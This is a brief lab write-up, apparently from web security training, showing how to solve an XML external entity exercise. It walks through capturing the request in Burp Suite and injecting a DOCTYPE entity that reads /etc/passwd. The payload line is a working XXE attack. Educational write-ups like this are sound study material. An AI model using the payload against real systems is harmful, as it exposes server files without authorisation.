### First Exercise

![problem.PNG](/assets/XXE/First/problem.PNG)


##### **To do**
```
To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 
```

1. View the petition with **Burp Suite**
   
![petition.PNG](/assets/XXE/First/petition.PNG)



2. You need to declare a entity to get content of `/etc/passwd`

```xml
<!DOCTYPE est [ <!ENTITY evil SYSTEM "file:///etc/passwd"> ] >
```

**Explanation**

![explanation.PNG](/assets/XXE/First/explanation.PNG)


3. Put the entity on the xml three

![entity.PNG](/assets/XXE/First/entity.PNG)

**Output**

![output.PNG](/assets/XXE/First/output.PNG)